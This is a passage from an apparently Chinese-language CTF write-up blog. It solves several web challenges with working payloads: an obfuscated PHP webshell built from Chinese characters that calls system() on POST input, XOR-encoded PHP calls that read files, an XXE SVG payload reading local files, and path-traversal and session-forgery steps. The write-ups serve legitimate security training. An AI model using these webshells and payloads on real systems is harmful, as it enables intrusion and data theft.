<p>还有注意下 r 变量的值为 user/Index ,原因如下代码，会将r参数的值 按  / 进行分割，拼接，我们利用变量覆盖函数对应的控制器为userController ,所以传参 ?r=user/Index</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu40.jpg"></p>
<p>🆗 </p>
<p>payload:</p>
<blockquote>
<p>?r=User/Index&amp;img_file=../../flag.php</p>
</blockquote>
<h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p>知识点：FILEINFO + getimagesize</p>
<p>看下源码，主要部分在 <code>upload.php</code></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu41.jpg"></p>
<p>首先判断文件大小，并使用 <code>FILEINFO</code> 判断上传图片类型，上传图片只能是 png 类型<br>后面再用 <code>getimagesize</code> 判断文件像素大小，并且再进行一次类型判断，如果不是 png 类型就给出 flag</p>
<p><strong>在这两种判断上传图片类型的函数中，有一个很有趣的现象， <code>FILEINFO</code> 可以识别 png 图片( 十六进制下 )的第一行，而 <code>getimagesize</code> 不可以</strong></p>
<p>所以我们上传的文件内容如下</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu42.jpg"></p>
<p>上传即可得到flag</p>
<h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p>知识点：<strong>利用汉字构造 shell</strong></p>
<p>审计代码，发现从传入文件内容的第6个字母开始黑名单匹配，fuzz被过滤字符</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu43.jpg"></p>
<p>只有这个几个是能用的了</p>
<p>利用方法，汉字构造shell，p神的文章里将的很详细了<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank">一些不包含数字和字母的webshell</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;mb_strlen(<span class="variable">$str</span>, <span class="string">&#x27;utf-8&#x27;</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$st</span> = mb_substr(<span class="variable">$str</span>, <span class="variable">$i</span>,<span class="number">1</span>, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">    <span class="variable">$a</span> = ~(<span class="variable">$st</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$a</span>[<span class="number">1</span>];				<span class="comment">#取汉字的第一位</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])		<span class="comment">#$_GET[&#x27;a&#x27;]想要得到的字符</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$st</span>;<span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过</p>
<blockquote>
<p><a href="http://localhost/?a=">http://localhost/?a=</a></p>
</blockquote>
<p>得到利用字母，按照P神文章里讲的拼接即可</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">我们可以通过<span class="symbol">$</span>_=~(<span class="string">&#x27;北&#x27;</span>)[<span class="number">1</span>]构造，但是无奈的是数字被过滤了。所以，在构造<span class="built_in">exp</span>前。就要先构造出<span class="number">1</span></span><br><span class="line"><span class="symbol">$</span>_=[]；</span><br><span class="line"><span class="symbol">$</span>__=<span class="symbol">$</span>_==<span class="symbol">$</span>_；</span><br><span class="line">#<span class="symbol">$</span>__是一个判断<span class="symbol">$</span>_是否等于<span class="symbol">$</span>_。返回True即<span class="number">1</span></span><br><span class="line">然后我们就可以构造<span class="built_in">exp</span>了</span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line"><span class="variable">$__</span>=[];<span class="variable">$____</span>=<span class="variable">$__</span>==<span class="variable">$__</span>;</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line"><span class="variable">$_</span>=~(北)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(熙)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(北)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(拾)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(的)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(和)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#system</span></span><br><span class="line"><span class="variable">$___</span>=~(样)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(说)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(小)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(次)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(站)[<span class="variable">$____</span>];<span class="variable">$____</span>=~(瞰)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$$___</span>[<span class="variable">$_</span>]);</span><br><span class="line"><span class="comment">#system($_POST[system]);</span></span><br></pre></td></tr></table></figure>
<p>得到文件目录，post传参 system=env</p>
<p>(env是环境变量，相当于phpinfo)</p>
<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><p>知识点：无字母数字shell构造</p>
<p><strong>PHP在处理字符串时有个有趣的特性。</strong></p>
<p><strong>PHP默认会把没有加引号的字符串当成常量处理，找不到对应常量就会将其解释成字符串</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> abc;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu44.png"></p>
<p><strong>虽然抛出警告，但是还是打印出了abc，并且这个警告我们可以用”@”，去掉。</strong></p>
<p><strong>还有一点，PHP调用函数，可以使用字符串调用。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(get_defined_functions());       <span class="comment">//正常输出该函数返回值</span></span><br><span class="line">print_r(<span class="string">&#x27;get_defined_functions()&#x27;</span>;      <span class="comment">//正常输出函数返回值</span></span><br><span class="line">print_r(<span class="string">&quot;get_defined_functions()&quot;</span>.<span class="string">&quot;\n&quot;</span>);    <span class="comment">//返回字符串&quot;get_defined_functions()&quot;</span></span><br><span class="line"><span class="variable">$b</span> = get_defined_functions();       </span><br><span class="line">print_r (<span class="string">&quot;<span class="subst">$b</span>&quot;</span>);  <span class="comment">//返回array</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>通过脚本，匹配出 <code>print_r(scandir(&#39;.&#39;));</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$l</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$r</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$argv</span> = str_split(<span class="string">&quot;_GET&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$argv</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">255</span>;<span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = chr(<span class="variable">$j</span>)^chr(<span class="number">255</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$k</span> == <span class="variable">$argv</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                <span class="variable">$l</span> .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">                <span class="variable">$r</span> .= <span class="string">&quot;%0&quot;</span> . dechex(<span class="variable">$j</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$l</span> .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">            <span class="variable">$r</span> .= <span class="string">&quot;%&quot;</span> . dechex(<span class="variable">$j</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\&#123;<span class="subst">$l</span>`<span class="subst">$r</span>\&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span></span><br></pre></td></tr></table></figure>
<p>但是题目还有一个条件，就是出现的不同字符数不能超过13，除了必要的（，），^ ,  ;  ，%ff我们最多再有8个字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//爆破</span><br><span class="line"><span class="comment">#https://g.yuque.com/u390550/hsy6gq/emyf3s?language=en-us</span></span><br><span class="line"></span><br><span class="line">result2 = [<span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x91</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8d</span>, <span class="number">0x8c</span>]  <span class="comment"># Original chars,11 total</span></span><br><span class="line">result = [<span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8c</span>]  <span class="comment"># to be deleted</span></span><br><span class="line">temp = []</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> result2:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">if</span> (a ^ b ^ c == d):</span><br><span class="line">                    <span class="keyword">if</span> a == b == c == d:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))</span><br><span class="line">                        <span class="keyword">if</span> d <span class="keyword">not</span> <span class="keyword">in</span> temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(<span class="built_in">len</span>(temp), temp)</span><br></pre></td></tr></table></figure>
<p>整理得</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">print_r(scandir(.));==((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>
<p>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; index.php [3] =&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )</p>
<p>文件在scandir的结果最后面，那么用end()方法就可以得到文件名了。读文件可以用show_source或者readfile</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="comment">//和上面一样的方法，构造出payload</span></span><br><span class="line"></span><br><span class="line">Payload:show_source(end(scandir(.)));==((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure>




<h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p>知识点<strong>：XXE+SVG</strong></p>
<p>/proc/self/cwd  显示当前位置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>PHP 代码审计</strong></li>
<li><strong>session 处理器甄别 + session 伪造</strong></li>
<li><strong>函数特性（file_exists）</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//代码审计</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//开头，将 session 的放置目录设置为 /var/babyctf/，并且启动 session，同时引入 /flag 内容，高亮代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] ===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="string">&#x27;/var/babyctf/success.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            safe_delete(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] =<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断 session 中 username 是否为 admin，是的话判断 /var/babyctf/success.txt 是否存在，存在的话就把 success.txt 删了，并显示 flag。如果username不为admin ,则为guest</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$direction</span> = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);</span><br><span class="line"><span class="variable">$attr</span> = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line"><span class="variable">$dir_path</span> = <span class="string">&quot;/var/babyctf/&quot;</span>.<span class="variable">$attr</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$attr</span>===<span class="string">&quot;private&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$dir_path</span> .= <span class="string">&quot;/&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取相关参数，均为 POST 参数，direction 表示是上传(upload)还是下载(download)操作，attr 会被直接拼接在 /var/babyctf 这个路径后面，如果 attr 为 private 则把用户名继续拼接在后面。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$direction</span> === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$dir_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_path</span> .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir(<span class="variable">$dir_path</span>, <span class="number">0700</span>, <span class="literal">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="variable">$upload_result</span> = <span class="string">&quot;uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$upload_result</span> = <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//上传操作，把上传文件的文件名拼接在 $dir_path （$dir_path= &quot;/var/babyctf/&quot;.$attr;）后面，同时加上下划线和这个文件内容的 sha256 摘要值，文件是我们上传的，文件内容知道的情况下这个值也是可以在本地算出来的。然后判断是否有路径穿越，逐级创建目录，将文件储存到下面上传就结束了    </span></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$direction</span> === <span class="string">&quot;download&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = basename(filter_input(INPUT_POST, <span class="string">&#x27;filename&#x27;</span>));</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$dir_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="variable">$file_path</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;file not exist&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: application/force-download&#x27;</span>);</span><br><span class="line">        header(<span class="string">&#x27;Content-Length: &#x27;</span>.filesize(<span class="variable">$file_path</span>));</span><br><span class="line">        header(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.substr(<span class="variable">$filename</span>, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile(<span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="variable">$download_result</span> = <span class="string">&quot;downloaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$download_result</span> = <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line"><span class="comment">//下载操作，获取要读取的文件名(POST filename参数)，拼接路径，判断是否有路径穿越，然后将文件内容返回。</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>思路：伪造 session 使自己变成 admin -&gt; 创建一个 success.txt 文件 -&gt; 读取 flag</p>
<p>我们要伪造admin ，首先需要知道session的处理器</p>
<p>session处理器形式我们可以通过读取session文件来得知，那么我们首先就需要先知道文件名，我们知道session文件命名格式为（<em>sess</em>_[PHPSESSID的值]）,phpsessid可以通过查看cookie知道，所有我们下载文件即可</p>
<blockquote>
<p>POST:   direction=download&amp;attr=&amp;filename=sess_+phpsessid</p>
</blockquote>
<p>得到返回内容</p>
<blockquote>
<p>username:5:”guest”;   (username前面有一个不可见字符)</p>
</blockquote>
<p>可知session处理器为php_binary</p>
